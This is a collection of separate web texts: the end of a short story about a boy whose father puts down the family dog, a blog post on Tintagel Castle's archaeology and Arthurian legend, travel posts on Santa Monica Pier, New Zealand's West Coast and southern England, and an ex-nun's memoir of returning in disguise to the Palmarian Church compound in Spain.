holding a brick in his hand. Homer&#x2019;s legs twitched.</p>   <p>Ruben began screaming, <em>&#x201c;No. No. No.&#x201d;</em> But the words stuck in his head, nothing came out of his mouth.</p>   <p>Dad let out a long shivery sigh and bashed Homer on the head. Homer stopped moving. Dad threw away the brick. It hit the wash-house and thumped into a clump of weeds.</p>   <p>Ruben gasped.</p>   <p>Dad caught sight of him. &#x201c;What are you looking at?&#x201d; he roared.</p>   <p>&#x201c;The vet,&#x201d; Ruben burst out.</p>   <p>&#x201c;The vet costs a bloody fortune!&#x201d;</p>   <p>&#x201c;Mum would help.&#x201d;</p>   <p>&#x201c;Two weeks child support to put him down &#x2013; that&#x2019;s how much a vet costs.&#x201d; Dad got up quickly, hitting his head on the tarpaulin. &#x201c;F***!&#x201d;</p>   <p>Stumbling over beer cans, Ruben ran back into the house, shutting the bedroom door and thudding back against it trembling with shock. It had never occurred to him that Dad paid Mum&#x2026;it was <em>his</em> fault Homer had been killed.</p>   <p>He heard Dad moving around in the kitchen. A pot lid fell onto the floor, clattering. Ruben barely breathed.</p>   <p>Dad crunched across the gravel path alongside the house.</p>   <p>Ruben crossed to the window. Head down, shoulders hunched against the drizzle, Dad went to Brodie&#x2019;s. The view blurred. Tears. Ruben blinked them back. Anger boiled up, he wanted a real Dad not a Big Red. He put on his hoodie; soft, smelling of Mum. He couldn&#x2019;t wait to see her in the morning, he&#x2019;d never visit Red again. Poor Homer! Opening the bedroom door, he trudged outside.</p>   <p>Red had pulled a rug over Homer&#x2019;s head. The dog&#x2019;s legs poked out. Ruben shuffled around the rug so that all of Homer was covered. He said, &#x201c;Goodbye Homer. We love you,&#x201d; and his heart shrank into a nut.</p>   <p>Ruben went down to the creek. The bread bag was in a bush, he fished out the last slices throwing them into the water. Eels gathered, gobbled and swam away.</p>   <p>Raindrops plinked down making ripples.</p>   <p>Ruben remembered how Red hadn&#x2019;t showed up last Christmas even though he&#x2019;d promised to. His shoulders shook, he started crying; it made him feel small, stupid and small. He tried hard to stop the tears, the effort making him shudder. He splashed water on his face and stood up as tall as he could. Dad was a useless dick&#x2026;although he <em>had</em> taken him eeling.</p>   <p>Walking on, Ruben saw a spider web spread between the fig tree and the loo. Raindrops clung to the web, which quivered when another drop landed on it. Ruben counted twenty seven drops, shiny as mirrors, reflecting twenty seven miniature Ruben&#x2019;s. He ripped off the web, wiping the sticky mess onto the grass.</p>   <p>By the time he reached the house it was almost dark. He looked in the fridge &#x2013; only the off-milk, stinky shrivelled-up eel, a crumbling block of cheese and two beers.</p>   <p>Footsteps up the gravel: he froze.</p>   <p><em>Knock-knock</em>. &#x201c;Hey, little buddy?&#x201d;</p>   <p>Brodie! Ruben opened the door.</p>   <p>&#x201c;Are you okay?&#x201d;</p>   <p>&#x201c;Uhuh.&#x201d;</p>   <p>Brodie whistled admiringly at the eel picture Ruben had left on the table. &#x201c;Did you do that?&#x201d;</p>   <p>&#x201c;Yep.&#x201d;</p>   <p>&#x201c;<em>Awe</em>some.&#x201d;</p>   <p>&#x201c;It&#x2019;s for Mum.&#x201d;</p>   <p>&#x201c;She&#x2019;ll love it.&#x201d;</p>   <p>&#x201c;Hope so.&#x201d;</p>   <p>Brodie sighed. &#x201c;My old man was gonna finish off Homer if Red didn&#x2019;t do it. It must have been hard, Ruben, he loved that dog.&#x201d;</p>   <p>Silence grew.</p>   <p>&#x201c;Ah well, Red takes his time, but he gets there in the end. He even got rid of the rubbish, eh?&#x201d;</p>   <p>Ruben bit his lip.</p>   <p>&#x201c;Gotta go. Your Dad won&#x2019;t be long,&#x201d; he said, squeezing Ruben&#x2019;s shoulder.</p>   <p>Ruben felt a bit better. He rummaged in the cupboards finding a packet of two-minute noodles. He boiled the jug and stirred water through the noodles, dragging his fork around the bowl making sure he ate every last scrap. They were all there was to eat apart from the Coco Pops and he&#x2019;d need those for breakfast.</p>   <p>Still hungry, Ruben thought he&#x2019;d try a beer. He grabbed a can from the fridge, ripping off the tab and having a go. Yuk! It tasted of old socks. Another sip, the bubbles tickled his nose.</p>   <p>Car tyres squealed outside, skidding to a stop. There came a loud whoop from next door&#x2026;rowdy singing&#x2026;<em>&#x201c;Nah nah nah, nahnah, nah nah nah, nahnah. Hey beauty when the moon gets you down</em>.<em>&#x201c;</em></p>   <p>Ruben went into the lounge, switching on the telly; boring news, boring cricket, <em>Dancing With Stars</em>. The sparkly dancers swirled around while he sipped the beer, sitting in Red&#x2019;s armchair. His head began to spin. Was he drunk? It no longer mattered that he was hungry and lonely, the universe would grant him one wish, one simple wish&#x2026;</p>   <p>&#x2013;</p>   <p>Ruben tried to roll over. He was caught in a huge hand and the harder he tried to break free, the tighter it gripped. Panicked, he gave one last heave &#x2013; and woke. He&#x2019;d sunk deep into the armchair. Someone had put a blanket over him. Dad?</p>   <p>He spied the beer can and remembered last night: Dad storming off, the empty cupboards, the people next door laughing. Anger flared, Red had blamed <em>him</em> for Homer dying.</p>   <p>Ruben smelt bacon. Curious, he went into the kitchen.</p>   <p>Brodie was breaking eggs into a fat-spitting frying pan. &#x201c;Morning,&#x201d; he said. &#x201c;Hope you&#x2019;re into fry-ups, best thing for a hangover.&#x201d;</p>   <p>Ruben blushed. &#x201c;Did you go to the shops?&#x201d;</p>   <p>&#x201c;This place needs a woman, it&#x2019;s a tip.&#x201d;</p>   <p>A stack of toast was on the table, a carton of apple juice, peanut butter, jam.</p>   <p>&#x201c;Where&#x2019;s Dad?&#x201d;</p>   <p>&#x201c;Out the back.&#x201d;</p>   <p>Ruben paused on the doorstep.</p>   <p>Dad was digging a big hole under the fig tree. Working out the spade, he dropped the load onto a growing heap.</p>   <p>His heart beating hard, Ruben slowly walked towards him. &#x201c;We buried my guinea pig in the garden.&#x201d;</p>   <p>Dad glanced up. Shocked at how sad he looked, Ruben stepped closer.</p>   <p>&#x201c;Want to help?&#x201d; Dad asked.</p>   <p>&#xa0;</p>    </div>  
   <div>   <blockquote>    <p>On a cold and damp day in January the family and I decided to visit Tintagel Castle in North Cornwall.</p>   </blockquote>   <figure>    <figcaption>     Walking down the valley towards Tintagel Haven. The castles outerward can be seen in the distance.    </figcaption>   </figure>   <p>For hundreds of years the site of Tintagel Castle has fascinated visitors and locals alike. &#xa0;Even without knowing any of its past the place oozes with untold stories and imaginations can run riot (which they have).</p>   <p><strong>The Fiction</strong></p>   <p>Ask almost anyone about Tintagel Castle and immediately King Arthur will come to the fore. &#xa0;It was Geoffrey of Monmouth who wrote the&#xa0;<em>History of the Kings of Britain&#xa0;</em>sometime between the 1135 and 1138 who associated Tintagel with King Arthur as the place where Arthur&#x2019;s father Uther Pendragon seduced/tricked Igerna into bedding him (Merlin and magic appear to be involved&#x2026;) and so Tintagel became known as the place where King Arthur was conceived. &#xa0;It should be noted that at no time did Geoffrey of Monmouth ever suggest that Tintagel was Arthur&#x2019;s home or that the castle belonged to him. &#xa0;The only connection was and is the his story of conception.</p>   <p><em>&#x201c;The History nowhere claims that Arthur was born at Tintagel, or that he ever visited the place later in life, or that in any sense the stronghold became his property when he was King&#x2026;On so slight a foundation, almost every subsequent writer was able to expand the conception of Arthur at Tintagel to his birth there and, by implication, ownership and even residency.&#x201d; &#xa0;(</em>Thomas C. 1993)</p>   <p>Whilst it is understandable, after all this part of Cornwall with its dramatic coastline rather lends itself to stories of magic, romance, skulduggery and drama. &#xa0;It seems a shame that the Arthur connections &#x2013; real or imaginary &#x2013; detract from the true story of the headland and its castle.</p>   <p><b>The Facts</b></p>   <p>The remains the visitor sees today can be divided roughly into two phases of occupation, post-Roman and after 1100AD.</p>   <p>The occupation of the headland in the post-Roman era was originally believed to have represented the remains of early Celtic monastery. &#xa0;This theory has now been rejected and instead it is believed that the site is that of a &#x201c;&#x2026;high status secular settlement probably used by the Kings of Dumnonia between the Roman withdrawal in 410AD until the end of the seventh century AD, and it has now been identified as the Durocornouis (fortress of the Cornish)&#x2026;&#x201d; (Weatherhill C. 2009).</p>   <figure>    <figcaption>     Site C &#x2013; the low dry stone walls of Post Roman buildings.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>The buildings which are associated with this phase can be found clustered around the later medieval chapel, below on the cliff edge (just above the iron gate) and further along the headland. &#xa0;Many of the buildings were revealed after a scrub fire on the headland. &#xa0;Excavations have produced vast quantities of Mediterranean pottery such as amphorae dating to the fifth and sixth centuries. &#xa0;The amount of imported pottery exceeds the amounts found on all other known post-Roman sites in Britain.</p>   <p>An often overlooked feature of the headland is the indentation known as Arthur&#x2019;s footprint. &#xa0;It is an eroded hollow in the rock on the highest point of the headland and shaped roughly like a footprint. &#xa0;Its association with Arthur is irrelevant as it is more likely an indication of ceremonies enacted here during the post-Roman period if not earlier.</p>   <p>In parts of Ireland and Scotland there are places which &#xa0;also have footprint type impression in rock and are associated with inauguration ceremonies of important people well into medieval times. &#xa0;Symbolically, placing a foot in a specific place is representative of a persons right to rule over the surrounding territory. &#xa0;Is it not possible that this example here at Tintagel was something similar and equally ancient.</p>   <p><em>&#x201c;It can be wondered. therefore, if the occasions when the Dumnonian ruler and his court &#x2013; or any other major chieftain in the post-roman south-west &#x2013; came to Tintagel included public recognition of a king as replacing his dead predecessor, and whether this rock-marking figured in ceremonies.&#x201d; (</em>Thomas C 1993).</p>   <p>Perhaps the importance of Tintagel during this period cannot be over emphasised enough.</p>   <figure>    <figcaption>     Site B &#x2013; the low walls in the foreground are Post Roman. The inner and outer ward of the 12th century are visible in the distance.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>The second phase of settlement belongs in the twelfth century and is the result of building works done under the auspices of Richard the Earl of Cornwall. &#xa0;Richard was made Earl of Cornwall in 1227 and in 1233 bought Bossiney and Tintagel from Gervase de Hornicote although it does seem that building works had already begun by this time.</p>   <p>Much of the impressive remains the visitor sees today are the ruins of Richards castle. &#xa0;The inner ward is on the island and the outer ward is on the main land side. &#xa0;Originally there appears to have been a bridge between the two as by this time the land bridge had all but eroded away.</p>   <figure>    <figcaption>     The remains of the great hall in the inner ward.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>One question does need to be asked at this point &#x2013; why did the Earl of Cornwall build a substantial castle here in Tintagel? &#xa0;It is far from the centers of Cornish commerce and it is no where near the main routes into and out of Cornwall. &#xa0;It defends nothing but open water. &#xa0;In short it has no military value or function and is that not what castles are for? &#xa0;So then, why Tintagel?</p>   <p>Richard was the second son of King John and by all accounts was an ambitious and educated man who had decided to make a statement. &#xa0;He would have read Geoffry of Monmouth&#x2019;s&#xa0;<em>History</em> and would have been told about Tintagel being the ancient seat of the rulers of Dumnonia. &#xa0;His decision to build a flashy castle here was his way of saying to the Cornish people and others &#x2013; &#x201c;Here I am, your Earl &#x2013; from this ancient seat of power I will rule&#x201d;.</p>   <figure>    <figcaption>     An interpretation board depicting what the hall would have looked like in the time of Earl Richard.    </figcaption>   </figure>   <p>&#xa0;</p>   <p><strong>Final Facts</strong></p>   <ul>    <li>The headland has two freshwater wells.</li>    <li>The Chapel is dedicated to St Juliot and is 12th century in date but seems to have earlier origins.</li>    <li>The tunnel is an enigma, dug into the stone bedrock of the island with small iron tools, it is most likely medieval in date and it has been suggested it was a cool store for foodstuffs such as meat.</li>    <li>Merlin&#x2019;s Cave is a great place to explore at low tide but is unlikely to have anything to do with the Merlin of Arthurian myth.</li>    <li>The beach below the headland is known as the Haven.</li>   </ul>   <blockquote>    <p>In the end, it is fair to say the story of Tintagel Castle is not complete. &#xa0;I, as much as the next person have a great affection of the Arthurian stories and if such stories provide impetus for the average person to visit Tintagel then all the better. &#xa0;But personally the facts are the clincher &#x2013; it is they which make the better story.</p>   </blockquote>   <p><strong>Sources</strong></p>   <p>Thomas C. 1993&#xa0;<em>Tintagel &#x2013; Arthur and Archaeology &#xa0;</em>English Heritage/Batsford.</p>   <p>Weatherhill C. 2009&#xa0;<em>Cornovia Ancient sites of Cornwall and Scilly 4000BC &#x2013; 1000AD.&#xa0;</em>Halsgrove.</p>   <figure>    <figcaption>     Merlins Cave.    </figcaption>   </figure>   <figure>    <figcaption>     The feature known as the tunnel.    </figcaption>   </figure>   <figure>    <figcaption>     The inner wall of the tunnel showing the cut marks made by iron tools.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     The remains of the 12th century chapel to St Juliot.    </figcaption>   </figure>   <figure>    <figcaption>     View of the outer ward from the island.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     The rear wall of the great hall.    </figcaption>   </figure>   <figure>    <figcaption>     Remains of the inner ward &#x2013; ancillary buildings to the great hall.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     A stormy sea in the Haven.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     Sheep have been reintroduced to keep vegetation from taking over the island.    </figcaption>   </figure>   <figure>    <figcaption>     The post medieval doorway framing a view of Glebe Point.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>  </div>  
   <div>   <p>We had been on the road for eleven days before we reached the beginning of the Route 66 leg of our nineteen-day trip. We left Oxnard, California, on a Thursday morning and drove down California Highway 1 awed by scenic ocean views, through Malibu where homes of the rich and famous were blocked from view by lush landscaping and iron gates, to Santa Monica.</p>   <h2>The beginning&#x2014;or is it the end?</h2>   <p>The Santa Monica Pier is usually considered the end of Route 66, and we&#x2019;d usually agree, but circumstances had us working our way west to east rather than east to west on this trip. Our first stop was the visitor center kiosk in Palisades Park for photo ops with &#x201c;West End of Route 66&#x201d; signs.</p>   <p>But we thought Route 66 actually ends at the pier, which we could see in the distance as we walked through the park to the edge of the sandstone bluffs.</p>   <p>So we hoofed it to the pier, and sure enough, there were more &#x201c;End of Route 66 signs.&#x201d; I&#x2019;ve found out since our trip that there&#x2019;s a brass plaque somewhere that marks the true end, which we didn&#x2019;t see.</p>   <h2>A little history lesson</h2>   <p>The pier was built in 1909, had seen an amusement park and a ballroom come and go before Route 66 was extended to Santa Monica in 1936. The only ride that remained from the amusement park at that time was the carousel. However, a yacht harbor was created in 1934, two years before Route 66 was extended.</p>   <p>The pier was set for demolition in the 1970s, but locals protested and passed Proposition 1, an initiative to preserve the pier forever.</p>   <p><span><strong>Don&#x2019;t miss a U.S. Long Cuts post.&#xa0; For a FREE subscription, enter your e-mail address in the Subscribe to U.S. Long Cuts box in the upper right and click Subscribe.</strong></span></p>   <p>In 1983 much of the pier was destroyed by a winter storm. It was ready for rehabilitation anyway, so they were able to start with a clean slate.</p>   <h2>Santa Monica Pier today</h2>   <p>The carousel building, the Hippodrome, is the original built by Charles Looff in 1916. The carousel inside, a 1922 Philadelphia Toboggan Company carousel, has been there since 1947. The building also holds a soda fountain.</p>   <p>Restaurants, an arcade and an amusement park line the south side of the pier. On the north side, overlooking the beach, vendors sell souvenirs and snacks, street performers entertain, and caricature artists will create an exaggerated likeness of you.</p>   <p>We visited on a weekday morning, and the pier was bustling. It would have been fun to ride the Ferris wheel in Pacific Park or take a spin on the carousel, but we still had a lot of road to travel that day. We had only eight days to explore what we could at the western side of Route 66.</p>   <p>The Santa Monica Pier is a great way to celebrate the end of your Route 66 journey if you&#x2019;re driving east to west or the beginning of your west-to-east drive.</p>   <p><span><strong>For travel information about the U.S. Midwest, be sure to check out our </strong></span><span><strong> blog, too.</strong></span></p>   <p>The is located off of Colorado Avenue and Ocean Avenue in Santa Monica, California.

   <article>   <header>    <h1>Hokitika Gorge &#x2013; December 9</h1>   </header>   <section>    <aside>     <p>August 24, 2014</p>    </aside>    <p>We decided against our original plan to visit Franz Josef Glacier. Instead, we headed straight for Hokitika Gorge. Once you get to the town of Hokitika, you turn east and zig and zag your way around the farms for about 35 minutes. Fortunately, the route is well marked.</p>    <p>Once at the carpark, it&#x2019;s only about a 10 minute walk to the gorge. The color of the water is this unique milky turquoise from the glacial runoff.&#xa0;&#xa0; Our photos are not retouched!</p>    <p>&#xa0;</p>    <p>We crossed the bridge to the other side and wandered around a bit on the rocks.</p>    <p>Instead of driving back to Hokitika, we continued on the backroads to Lake Kaniere. There were several geocaches placed along its shores, which was one of its draws. The first one looked like it would be an easy walk a bit off the road. Wrong! It was about 2km up and down some steep hills, and ended at a platform overlooking the lake. We never saw another person the entire time.</p>    <p>The next geocache took us to Dorothy Falls. There was another couple there so we didn&#x2019;t attempt looking for a cache and only took a quick photo. Across from the trailhead to the falls is another trail to the lakeshore. A geocache was located there as well. There was a family with a dog at the edge of the lake and Fred talked to them, while I went into the bush and found the cache. The never suspected a thing.</p>    <p>&#xa0;</p>    <p>&#xa0;</p>    <p>We still had plenty of time so headed up to Arahura Cesspool. We had read about a swingbridge at the Arahura Styx River track and tried to get to it. We found the iron gate and traveled to the washout. Then we attempted to travel on foot for the last 2km to the bridge. We had to cross the stream and through a cow paddock, then cross the stream again and head up a hill. The track was in bad shape and progressively got muddier and muddier. My shoes were soaked. When we came to about the 7th mud puddle that required bushwacking around, we threw in the towel. I was disappointed we couldn&#x2019;t get to the swingbridge, it was made entirely of cable from what pictures showed of it. Too bad the track was so bad.</p>    <p>We headed for our campground located halfway along SH73 to Arthur&#x2019;s Pass. Jackson&#x2019;s Retreat had fabulous views across the valley viewing Lake Brunner Road and the owner was very welcoming. There were two other campervans there besides us. The toilet and shower block was top notch. It was a good end to a long day.</p>   </section>  </article>  
   <div>   <p>We hired a car in Seville, set the GPS to English, and quickly headed out of the city and along the main highway towards Utrera. It was Sunday afternoon, 17 January 2016, the sky cloudy.</p>   <div>    <p>The Basilica of Palmar de Troya</p>   </div>   <p>I was playing with the movie camera, nerves quietly scrambled, watching groves of olive trees slip past, reminiscing about another time. And, reminiscing about what seems like another life, when I was a Carmelite of the Holy Face of Jesus &#x2013; dressed in a long brown habit, face covered by a black veil &#x2013; silenced, hidden, invisible. In the distance, Basilica&#xa0;spires suddenly speared an overcast sky. We were nearly there, nearly at Palmar de Troya.</p>   <div>    <p>A street in the Village of Palmar de Troya</p>   </div>   <p>We veered off the highway towards the village, and parked. The streets were quiet, except for a blaring radio, a lone dog, and a few workmen. Locals eyed us with suspicion as we wandered around, filming. It was a chance to speak a bit of Spanish and improve my accent.</p>   <p>A couple of hours later, after coffee and cake in a simple caf&#xe9; where the owners was still cleaning after a late Saturday night&#x2019;s revelry, we walked up the path to the Basilica&#xa0;compound.</p>   <div>    <p>I felt so small &#x2013; outside the gates of the compound</p>   </div>   <p>The sun was breaking through, heightening colour and contrast. There was no-one in sight, just huge concrete walls, five metres high, quietly screaming fortress &#x2013; not church. The walls looked impenetrable, un-scalable, with entry via heavy iron gates, always guarded, always closed and bolted&#xa0;&#x2013; exactly as I remembered it from my time there, twenty-five years ago.</p>   <p>&#xa0;</p>   <div>    <p>The wall with barbed-wire</p>   </div>   <p>The walls had been extended at the rear of the compound to allow farm animals to graze. We tried to peer over the walls as the land undulated but, as soon as we got a little closer, guard dogs barked noisily, raising alarm, although no-one appeared. Rolls of barbed wire attached to the walls, in one section, indicated even more determination to intimidate anyone contemplating mischief.</p>   <p>Self-sufficiency, in the form of dozens of solar panels and a wind farm, suggest a new direction of sustainability for the Order of the Carmelites of the Holy Face of Jesus; at least, since our last visit in 2007.</p>   <p>The following afternoon, back at the hotel, Nicholas and I dressed correctly according to the Palmarian dress code, hoping to gain entry into the compound. Nicholas wore long trousers (jeans are forbidden), a long sleeved shirt buttoned at the neck, a woollen jumper and jacket, socks and shoes.</p>   <div>    <p>Wearing my disguise</p>   </div>   <p>I wore a long skirt, well below the knee, with a long sleeved jumper and coat, buttoned at the neck &#x2013; plus a wig and black lace mantilla. Since I am an ex-nun of the Palmarian Church, and left the Order in 1990 having taken final vows, I am excommunicated and, therefore, not welcome there; hence, a wig as disguise.</p>   <p>We left the hotel, caught a bus, arrived at the train station and hired a car &#x2013; once again. Rush-hour traffic slowed our journey through the city centre as the winter&#x2019;s sun was pulled over the horizon. We continued our journey in the dark, obeying GPS prompts, minds firmly focused on our mission. By the time we arrived at the Basilica&#xa0;of Palmar de Troya, it was 7:00 pm and pitch black. We parked at the front entrance and waited. A few vehicles came and went as we discussed our plan. Half an hour later, we knocked on the iron gates. A security guard opened the door, interrogated us and checked our clothing.</p>   <div>    <p>I asked if we could come in: &#x201c;Podemos entrar?&#x201d;</p>   </div>   <p>We stepped inside. Automatic lights switched on as we walked up the path bordered by Phoenix palm trees. The grand doors of the Basilica&#xa0;opened and three cardinals came outside and headed towards us. &#x201c;Where are you from? Who are you?&#x201d; The security guard had obviously phoned someone and three cardinals had been sent to check on us. The questions were spoken in Spanish by the Vicar General, and translated into English by one of the other cardinals.&#xa0;I turned away, fearing the close encounter, and sure recognition, as I pulled my mantilla over the side of my face.</p>   <p>&#x201c;Why are you here? Who do you know? Where did you get the scapulars?&#x201d;&#xa0;We explained that I had made them. &#x201c;They are out-of-date but quite well made,&#x201d; the English cardinal said, somewhat amused, as he asked permission to inspect them.&#xa0;Nicholas obliged, turning it over so the cardinal could look at the reverse. &#x201c;Tell me! What are your names?&#x201d; A little black book appeared. They wrote down our names which were fake. Then: &#x201c;Take the scapulars off, right now. Only Palmarians are allowed to wear the Holy Face scapular. Take them off, now.&#x201d; The Vicar General was annoyed.&#xa0;We obeyed. &#x201c;You&#x2019;re not allowed to receive the sacraments.&#x201d;&#xa0;We tried to appease them.&#xa0;All the questions were directed at Nicholas. I was, after all, a mere woman and definitely second class, in their opinion.</p>   <div>    <p>The Basilica of Palmar de Troya ablaze with lights</p>   </div>   <p>&#x201c;Are you filming?&#x201d; More annoyance. &#x201c;Yes.&#x201d; &#x201c;Stop filming. No cameras.&#x201d;&#xa0;We obeyed. &#x201c;Journalists write false things about us.&#x201d; &#x201c;Why is that?&#x201d; Nicholas asked. &#x201c;They don&#x2019;t understand us.&#x201d;&#xa0;Further discussion followed. &#x201c;How many believers are there worldwide?&#x201d; Nicholas asked. They wouldn&#x2019;t answer that question. But they did say that they have brought everyone from Australia there, which suggested that there weren&#x2019;t many Australian Palmarians. &#x201c;Your group is very small, isn&#x2019;t it?&#x201d; Nicholas continued. Once again, they wouldn&#x2019;t comment. However,&#xa0;their conversation indicated that they knew the name of every believer, worldwide, suggesting that the total number of believers is very small, indeed. Finally: &#x201c;You may enter the church for Benediction and the procession, followed by the Stations of the Cross. The Stations are quite long, about one and a half hours. But you may enter and observe. That is alright.&#x201d; &#x201c;Thank you,&#x201d; we said. &#x201c;We are the true Church, you know.&#x201d; And, with that, they turned and walked back to the Basilica.</p>   <p>As Nicholas and I gazed at the imposing walls around the compound, the iron gates opened to let a vehicle through. &#x201c;Let&#x2019;s get out of here,&#x201d; Nicholas said. He didn&#x2019;t like being locked in. He felt trapped. &#x201c;If we can&#x2019;t film, there&#x2019;s no point in going into the Basilica.&#x201d; I wasn&#x2019;t keen to put my disguise to the test, once again, by trying to enter the Basilica. I&#x2019;d been lucky &#x2013; I hadn&#x2019;t been recognised by the cardinals because they didn&#x2019;t know me. They must have joined the Order sometime in the last twenty-five years, since my departure, but I couldn&#x2019;t be sure my disguise would hold up, once inside.</p>   <p>So, with hearts beating wildly, we walked towards the open gates, each step a symbol of our rejection of the Palmarian Church, its fanatical religious leaders and rigid thinking, its excessive rules, its limited view of life and women.</p>  </div>  
   <div>   <p>After two-and-a-half weeks, we&#x2019;re back from England. Our trip was amazing. My head is still filled with thoughts of England, and we took almost 5,000 photos, so you&#x2019;ll be hearing from me about England for a good while to come. Here&#x2019;s a quick review of the places we visited and the things we did each day, along with some tips for a better experience if you are visiting.</p>   <h3>Day 1</h3>   <p><strong>Bath</strong></p>   <ul>    <li>: An impressive church in the heart of the city. If you are in Bath, it&#x2019;s definitely worth going in and having a look, especially since it&#x2019;s free. Be sure to take a close look at the beautiful stained-glass windows.</li>    <li>Walking around in Bath: The city is very walkable and has a plethora of interesting, historic buildings. The giant lawn in front of the Royal Crescent is great for picnics, rest, people watching, and, for at least one couple while we were there, making out. The shopping is all down by Stall Street and the train and coach stations, and that area tends to get very crowded on the weekends with tourists and day-trippers all converging on it, but walk a few blocks away and you get into some much more peaceful residential neighborhoods that still boast interesting features. Don&#x2019;t try driving into the city. Parking is a pain.</li>   </ul>   <h3>Day 2</h3>   <p><strong>South Wales</strong></p>   <ul>    <li>: One of the most underrated attractions in Britain, perhaps because it&#x2019;s a little bit out of the way of the typical tourist route that revolves around London. As you approach it by car, you turn around a sharp bend and there it is, seemingly popping out of the ground. When you step on the grounds, there&#x2019;s an eerie silence except for the wind caroming through this skeletal remain of a once-glorious church and the occasional sound of pigeons and doves flapping their wings. It all combines to make the place hauntingly beautiful. It&#x2019;s not hard to see why this place moved Wordsworth to verse.</li>    <li>: The capital of Wales has some urban sprawl, but it&#x2019;s still a neat town. Cardiff Castle sits right in the middle of town, and next to it, the Central Market and the surrounding shops and arcades are worth checking out. Also, the whole city seems crazed about its rugby team.</li>   </ul>   <h3>Day 3</h3>   <p><strong>Bath</strong></p>   <ul>    <li>: This annual September event is a must-do for all Austen fans who are visiting Bath. And if you&#x2019;re not an Austen fan, it&#x2019;s fun to just show up for the Grand Promenade (always on the first Saturday of the week-long festival) that marks the beginning of the festival to snap pictures and gawk at hundreds of nerds dressed in Regency attire. The promenade starts in front of Bath Abbey and ends at Queen&#x2019;s Place Square.</li>    <li>: This was mildly interesting and probably would be more so if you were interested in fashion. Otherwise, it&#x2019;s an easy attraction to skip.</li>    <li>: The center&#x2019;s exhibits have received mediocre reviews on TripAdvisor.com, but even the critics on there agree: The tea room on the third floor of the center serves great afternoon tea. What&#x2019;s more, you get to sip that tea under the genteel gaze of a big painting of Colin Firth as Mr. Darcy. That face, by the way, is plastered everywhere in the center, from the welcome sign at the entrance to the cans of shortbread in the gift shop.</li>   </ul>   <h3>Day 4</h3>   <p><strong>Southwest England</strong></p>   <ul>    <li>: A definite must-do for any visitor to England. However, instead of just looking at the stones from behind the ropes from a few hundred feet away, shell out a bit more cash and get the , which lets you actually walk between the rocks (though you&#x2019;re not allowed to touch them). They offer this special access at certain times of the year and for one to two one-hour sessions each day either before or after regular visiting hours. Suck it up and go for the 6:45 a.m. session. Once you watch the sun rise over Stonehenge from amidst the stones, you&#x2019;ll never see them quite the same way again.</li>    <li>: If ancient stone monuments are your thing, then this is worth a look since you are actually allowed to touch the stones. In fact, they are just strewn across a giant tract of pasture land in the middle of the nowhere. There are chalk walking trails (the area used to be an ancient seabed) going right to and past the stones, as well as flocks &#xa0;of sheep that graze in their shadows. It&#x2019;s about a 45-minute drive from Stonehenge and the route is very scenic, though a bit narrow at times. We also got a surprise view of the white horse hillside carving along the way. The village of Avebury, which sits right next to the stone circle, is pretty cute and worth a quick walkthrough, though the gift shop and the National Trust facilities in the village are a bit touristy.</li>    <li>: An extremely adorable village that has served as a filming location for numerous movies and TV shows set in adorable British villages. It&#x2019;s also very touristy as every other shop sells photos of movie stars on location. The Red Lion serves some pretty good food. On the drive to Lacock, keep an eye out for scenic views of the valleys and hills.</li>    <li>: Another old abbey that has also appeared in movies. The bottom floors are more interesting as they consist of construction from various older periods of the abbey&#x2019;s 800-year history. The upper floors, which were renovated in the 1800s and which now serve as the Fox Talbot Museum, are a bit more a jumble of styles and artifacts.</li>    <li>: It was a hectic drive to get there, but the payoff was well worth it as this was one of the surprise hits on our itinerary. Once you get up there, you realize that the remnants of the 15th-century St. Michael&#x2019;s Church at the top of the tor are just decoration, as the best view is down, not up. The view from 557 feet is spectacular, and we were told that on a clear day you can see to the other side of the English Channel on one side and to Wales on another. You can either walk all the way up to the top of the tor, which could take about an hour or so, or take a bus from the Glastonbury Abbey courtyard that will drop you off at a spot about a 15-minute hike from the top. Just to add to your England experience, we recommend taking the bus and then watching the driver negotiate the one-car-wide but two-way road up and down the tor. Watch out for sheep poo on the hike up the tor.</li>   </ul>   <h3>Day 5</h3>   <p><strong>Bath</strong></p>   <ul>    <li>: This was a good exhibit that strikes a nice balance between being interesting and educational. There are a lot of models and exhibits explaining the history of the baths in the museum portion, and the bathing pool in the center is a good photo spot, especially from the upper railings, where you can get a nice view of Bath Abbey in the background. The free audio tour is excellent, even the kids&#x2019; tour. Your ticket to the baths also entitles you to one glass of the hot spring water that has drawn people to Bath for centuries. The water tastes warm and mineraly, which we didn&#x2019;t mind too much as we finished our glasses. However, if this was in China, you might very well be calling it contaminated and undrinkable. In Bath, though, it&#x2019;s a tourist attraction. The whole place takes about two hours to see thoroughly, especially if you listen to most of the audio tour.</li>   </ul>   <p><strong>Cotswolds</strong></p>   <p>This stretch of English countryside is indescribably beautiful. Don&#x2019;t worry so much about getting to your final destination. Just drive, look out for scenic spots, stop, and explore on foot. If you plan on driving, get the excellent directions for the , a particularly scenic route through the area (). Among the places we stopped at:</p>   <ul>    <li>: Blink and you&#x2019;ll miss their sign on the side of the road. Two potters share this space and they make some very nice pieces.</li>    <li>: This is one of the most well-known Cotswolds towns. The town center is pretty and has a number of shops and restaurants. The pay-and-display parking lot at the edge of the town also boasts of a public restroom that apparently is the Cotswolds Loo of the Year.</li>    <li>Willsersey: The small farming village where we stayed in the Cotswolds. Try The Bell Inn for an excellent dinner, and check out the church and community bulletins in the pub while you wait for your food. The items on there give a glimpse into life in these small villages and towns.</li>   </ul>   <h3>Day 6</h3>   <p><strong>Cotswolds</strong></p>   <ul>    <li>Biking around Cotswolds: Definitely one of the highlights of our trip and highly recommended if you are at all physically up to it. There are a number of places around the Cotswolds where you can rent bikes, and we got ours from in Chipping Campden. Just pick an easy route and enjoy the scenery. The roads are pretty safe with little traffic, and drivers here do a pretty good job of respecting cyclists. There are some steep hills, but you can just push your bike up those. We did a 15-mile loop that was called &#x201c;undulating&#x201d;, which featured two or three of these steeps hills and took us about four hours to complete, with a lot of stopping and photographing thrown 